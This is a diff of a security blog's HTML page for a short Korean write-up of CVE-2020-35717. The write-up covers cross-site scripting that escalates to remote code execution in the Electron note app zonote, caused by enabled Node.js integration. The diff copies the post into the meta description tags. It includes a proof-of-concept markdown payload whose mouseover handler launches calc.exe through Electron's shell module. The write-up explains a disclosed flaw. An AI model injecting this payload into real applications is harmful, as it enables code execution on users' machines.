@@ -13,15 +13,71 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="hack &amp; life">
+  <meta name="description" content="&lt;h2 id=&#34;URL&#34;&gt;&lt;a href=&#34;#URL&#34; class=&#34;headerlink&#34; title=&#34;URL&#34;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/remote-code-execution-through-cross-site-scripting-in-electron-f3b891ad637&#34;&gt;zonote RCE through XSS&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;p&gt;zonote &amp;lt;= 0.4.0&lt;/p&gt;
+&lt;h2 id=&#34;Explain&#34;&gt;&lt;a href=&#34;#Explain&#34; class=&#34;headerlink&#34; title=&#34;Explain&#34;&gt;&lt;/a&gt;Explain&lt;/h2&gt;&lt;p&gt;&amp;#xBB38;&amp;#xC11C; &amp;#xC791;&amp;#xC131; Electron App&amp;#xC778; zonote&amp;#xC5D0;&amp;#xC11C; RCE &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xACF5;&amp;#xAC1C;&amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. zonote &amp;#xBB38;&amp;#xC11C;&amp;#xC5D0; &amp;#xB9C8;&amp;#xD06C;&amp;#xB2E4;&amp;#xC6B4;&amp;#xACFC; html&amp;#xC744; &amp;#xC0BD;&amp;#xC785;&amp;#xD574; XSS(Cross-Site-Script) &amp;#xACF5;&amp;#xACA9;&amp;#xC744; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294;&amp;#xB370; &amp;#xC545;&amp;#xC6A9; &amp;#xBC94;&amp;#xC704;&amp;#xB97C; RCE&amp;#xAE4C;&amp;#xC9C0; &amp;#xD655;&amp;#xC7A5;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;It is paramount that you do not enable Node.js integration in any renderer (&lt;code&gt;BrowserWindow&lt;/code&gt;, &lt;code&gt;BrowserView&lt;/code&gt;, or &lt;code&gt;&amp;lt;webview&amp;gt;&lt;/code&gt;) that loads remote content.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.electronjs.org/docs/tutorial/security#2-do-not-enable-nodejs-integration-for-remote-content&#34;&gt;Electron&amp;#xC758; &amp;#xACF5;&amp;#xC2DD;&amp;#xBB38;&amp;#xC11C;&lt;/a&gt;&amp;#xC5D0; &amp;#xB530;&amp;#xB974;&amp;#xBA74; &amp;#xC6D0;&amp;#xACA9; &amp;#xCF58;&amp;#xD150;&amp;#xCE20;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD558;&amp;#xB294; &amp;#xBAA8;&amp;#xB4E0; renderer&amp;#xB294; Node.js intergration&amp;#xC774; &amp;#xBE44;&amp;#xD65C;&amp;#xC131;&amp;#xD654;&amp;#xB418;&amp;#xC5B4;&amp;#xC788;&amp;#xC5B4;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. XSS &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD574;&amp;#xB3C4; &amp;#xADF8; &amp;#xC545;&amp;#xC6A9; &amp;#xBC94;&amp;#xC704;&amp;#xB97C; renderer &amp;#xB0B4;&amp;#xBD80;&amp;#xB85C; &amp;#xC81C;&amp;#xD55C;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; Electron 5.0.0&amp;#xBD80;&amp;#xD130; &amp;#xAD8C;&amp;#xC7A5;&amp;#xD574;&amp;#xC628; &amp;#xAE30;&amp;#xBCF8; &amp;#xC124;&amp;#xC815;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&amp;#xB2E4;&amp;#xC74C;&amp;#xC740; zonote&amp;#xC758; main.js&amp;#xCF54;&amp;#xB4DC; &amp;#xC77C;&amp;#xBD80;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs js&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; browserWindowsOptions = {
+    ...
+    webPreference: {
+        nodeIntergration : &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;,
+        enableRemoteModule : &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;
+    }
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Node.js intergration&amp;#xC774; &amp;#xD65C;&amp;#xC131;&amp;#xD654;&amp;#xB418;&amp;#xC5B4;&amp;#xC788;&amp;#xC73C;&amp;#xBBC0;&amp;#xB85C; XSS&amp;#xB97C; &amp;#xD1B5;&amp;#xD55C; RCE &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;PoC&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs markdown&#34;&gt;&lt;span class=&#34;xml&#34;&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;onemouseover&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;xml&#34;&gt;try{&lt;/span&gt;
+&lt;span class=&#34;xml&#34;&gt;	const {shell} = require(&amp;apos;electron&amp;apos;);&lt;/span&gt;
+&lt;span class=&#34;xml&#34;&gt;	shell.openExternal(&amp;apos;file:C:/Windows/System32/calc.exe&amp;apos;)&lt;/span&gt;
+&lt;span class=&#34;xml&#34;&gt;}catch(e){&lt;/span&gt;
+&lt;span class=&#34;xml&#34;&gt;	console.error(e)&lt;/span&gt;
+&lt;span class=&#34;xml&#34;&gt;}&amp;quot;&amp;gt;&lt;/span&gt;Hover Me&lt;span class=&#34;xml&#34;&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+ - hack &amp; life">
   <meta name="author" content="j0dev, y2sman">
   <meta name="keywords" content>
   <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
 
   <meta property="og:type" content="website"> 
   <meta property="og:title" content="[하루한줄] CVE-2020-35717: RCE through XSS - hackyboiz">
-  <meta property="og:description" content="hack &amp; life">
-  <meta property="og:image" content="/img/favicon.ico">
+  <meta property="og:description" content="&lt;h2 id=&#34;URL&#34;&gt;&lt;a href=&#34;#URL&#34; class=&#34;headerlink&#34; title=&#34;URL&#34;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://medium.com/bugbountywriteup/remote-code-execution-through-cross-site-scripting-in-electron-f3b891ad637&#34;&gt;zonote RCE through XSS&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;p&gt;zonote &amp;lt;= 0.4.0&lt;/p&gt;
+&lt;h2 id=&#34;Explain&#34;&gt;&lt;a href=&#34;#Explain&#34; class=&#34;headerlink&#34; title=&#34;Explain&#34;&gt;&lt;/a&gt;Explain&lt;/h2&gt;&lt;p&gt;&amp;#xBB38;&amp;#xC11C; &amp;#xC791;&amp;#xC131; Electron App&amp;#xC778; zonote&amp;#xC5D0;&amp;#xC11C; RCE &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xACF5;&amp;#xAC1C;&amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. zonote &amp;#xBB38;&amp;#xC11C;&amp;#xC5D0; &amp;#xB9C8;&amp;#xD06C;&amp;#xB2E4;&amp;#xC6B4;&amp;#xACFC; html&amp;#xC744; &amp;#xC0BD;&amp;#xC785;&amp;#xD574; XSS(Cross-Site-Script) &amp;#xACF5;&amp;#xACA9;&amp;#xC744; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294;&amp;#xB370; &amp;#xC545;&amp;#xC6A9; &amp;#xBC94;&amp;#xC704;&amp;#xB97C; RCE&amp;#xAE4C;&amp;#xC9C0; &amp;#xD655;&amp;#xC7A5;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;It is paramount that you do not enable Node.js integration in any renderer (&lt;code&gt;BrowserWindow&lt;/code&gt;, &lt;code&gt;BrowserView&lt;/code&gt;, or &lt;code&gt;&amp;lt;webview&amp;gt;&lt;/code&gt;) that loads remote content.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.electronjs.org/docs/tutorial/security#2-do-not-enable-nodejs-integration-for-remote-content&#34;&gt;Electron&amp;#xC758; &amp;#xACF5;&amp;#xC2DD;&amp;#xBB38;&amp;#xC11C;&lt;/a&gt;&amp;#xC5D0; &amp;#xB530;&amp;#xB974;&amp;#xBA74; &amp;#xC6D0;&amp;#xACA9; &amp;#xCF58;&amp;#xD150;&amp;#xCE20;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD558;&amp;#xB294; &amp;#xBAA8;&amp;#xB4E0; renderer&amp;#xB294; Node.js intergration&amp;#xC774; &amp;#xBE44;&amp;#xD65C;&amp;#xC131;&amp;#xD654;&amp;#xB418;&amp;#xC5B4;&amp;#xC788;&amp;#xC5B4;&amp;#xC57C; &amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. XSS &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD574;&amp;#xB3C4; &amp;#xADF8; &amp;#xC545;&amp;#xC6A9; &amp;#xBC94;&amp;#xC704;&amp;#xB97C; renderer &amp;#xB0B4;&amp;#xBD80;&amp;#xB85C; &amp;#xC81C;&amp;#xD55C;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574; Electron 5.0.0&amp;#xBD80;&amp;#xD130; &amp;#xAD8C;&amp;#xC7A5;&amp;#xD574;&amp;#xC628; &amp;#xAE30;&amp;#xBCF8; &amp;#xC124;&amp;#xC815;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&amp;#xB2E4;&amp;#xC74C;&amp;#xC740; zonote&amp;#xC758; main.js&amp;#xCF54;&amp;#xB4DC; &amp;#xC77C;&amp;#xBD80;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs js&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; browserWindowsOptions = {
+    ...
+    webPreference: {
+        nodeIntergration : &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;,
+        enableRemoteModule : &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;
+    }
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Node.js intergration&amp;#xC774; &amp;#xD65C;&amp;#xC131;&amp;#xD654;&amp;#xB418;&amp;#xC5B4;&amp;#xC788;&amp;#xC73C;&amp;#xBBC0;&amp;#xB85C; XSS&amp;#xB97C; &amp;#xD1B5;&amp;#xD55C; RCE &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;PoC&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs markdown&#34;&gt;&lt;span class=&#34;xml&#34;&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;onemouseover&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;xml&#34;&gt;try{&lt;/span&gt;
+&lt;span class=&#34;xml&#34;&gt;	const {shell} = require(&amp;apos;electron&amp;apos;);&lt;/span&gt;
+&lt;span class=&#34;xml&#34;&gt;	shell.openExternal(&amp;apos;file:C:/Windows/System32/calc.exe&amp;apos;)&lt;/span&gt;
+&lt;span class=&#34;xml&#34;&gt;}catch(e){&lt;/span&gt;
+&lt;span class=&#34;xml&#34;&gt;	console.error(e)&lt;/span&gt;
+&lt;span class=&#34;xml&#34;&gt;}&amp;quot;&amp;gt;&lt;/span&gt;Hover Me&lt;span class=&#34;xml&#34;&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+ - hack &amp; life">
+  <meta property="og:image" content="https://hackyboiz.github.io/img/1day1line.png">
   <meta property="og:url" content="https://hackyboiz.github.io/">
 
   <link rel="canonical" href="https://hackyboiz.github.io/2021/01/06/fabu1ous/2021-01-06/">
@@ -257,7 +313,6 @@
         enableRemoteModule : <span class="hljs-literal">true</span>
     }
 }</code></pre>
-
 <p>Node.js intergration&#xC774; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4;&#xC788;&#xC73C;&#xBBC0;&#xB85C; XSS&#xB97C; &#xD1B5;&#xD55C; RCE &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p>
 <ul>
 <li>PoC</li>
@@ -269,9 +324,6 @@
 <span class="xml">}catch(e){</span>
 <span class="xml">	console.error(e)</span>
 <span class="xml">}&quot;&gt;</span>Hover Me<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span></code></pre>
-
-
-
 
             </div>
             <hr>
@@ -289,9 +341,9 @@
                 <div class="post-meta">
                   <i class="iconfont icon-tags"></i>
                   
-                  <a class="hover-with-bg" href="/tags/Fabu1ous/">Fabu1ous</a>
-                  
                   <a class="hover-with-bg" href="/tags/cve/">cve</a>
+                  
+                  <a class="hover-with-bg" href="/tags/Fabu1ous/">Fabu1ous</a>
                   
                   <a class="hover-with-bg" href="/tags/rce/">rce</a>
                   
